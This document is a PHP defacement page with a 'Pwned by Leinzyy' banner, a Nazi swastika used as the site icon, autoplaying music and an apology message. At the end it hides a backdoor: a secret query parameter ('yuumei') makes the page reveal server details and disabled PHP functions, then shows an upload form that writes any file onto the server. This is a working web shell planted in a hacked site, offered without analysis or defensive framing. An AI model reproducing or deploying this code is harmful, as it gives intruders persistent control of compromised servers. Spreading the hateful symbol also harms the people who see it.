<?php

echo '<html>

<head>

  <script type="text/javascript">

    //<![CDATA[

    msg = " • ";

    msg = "Leinzyy" + msg;

    pos = 0;

    function scrollMSG()

    {

      document.title = msg.substring(pos, msg.length) + msg.substring(0, pos);

      pos++;

      if (pos > msg.length) pos = 0

      window.setTimeout("scrollMSG()", 170);

    }

    scrollMSG();

    //]]>

  </script>

  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

  <meta name="viewport" content="width=device-width, initial-scale=0.86, maximum-scale=5.0, minimum-scale=0.86">

  <meta name="robots" content="index,follow" />

  <meta name="keywords" content="Leinzyy, Pwned by, Okayasu">

  <meta name="description" content="Sorry.." />

  <meta name="robots schedule" content="auto" />

  <link rel="shortcut icon" type="image/jpg" href="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bd/National_Socialist_swastika.svg/2048px-National_Socialist_swastika.svg.png" />

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

  <link rel="stylesheet" href="https://trafford.latestbuild.dev/assets/main.css">

  <script src="https://trafford.latestbuild.dev/assets/main.min.js" type="text/javascript"> 

  </script>

  <script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script>

</head>

<!-- end of your HTML head -->

<body onload="print();">

  <div id="img"></div><br />

  <div id="h1">Pwned By <a id="h0">Leinzyy</a></div>

  <center>

    <hr>

    <font color="lime">

      <font size="4">

        <p> A-ano... </p>

        <div id="h2"><br>

          Im not hacker...<br>

          I just leave my name ...<br>

          Im so sorry if you get terrible about it..</div>

        <br />

        <div class="footer">

        <br />

       <audio class="audio" autoplay controls src="https://i.top4top.io/m_19632ivxg0.mp3">

       </audio>

 </div>

</body>

<!-- End of your HTML body -->

</html>'

?>

<?php

if(isset($_GET["yuumei"]))

 {

  echo "<font color=lime>".php_uname()."";

  print "\n";$disable_functions = @ini_get("disable_functions");

  echo "<br>DisablePHP=".$disable_functions; print "\n";

  echo "<form method=post enctype=multipart/form-data>"; 

  echo "<input type=file name=f><input name=k type=submit id=k value=upload><br>"; 

    if($_POST["k"]==upload)

{ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>".$_FILES["f"]["name"];}else{ echo"<b color=red>Gagal upload co...";}}}?>
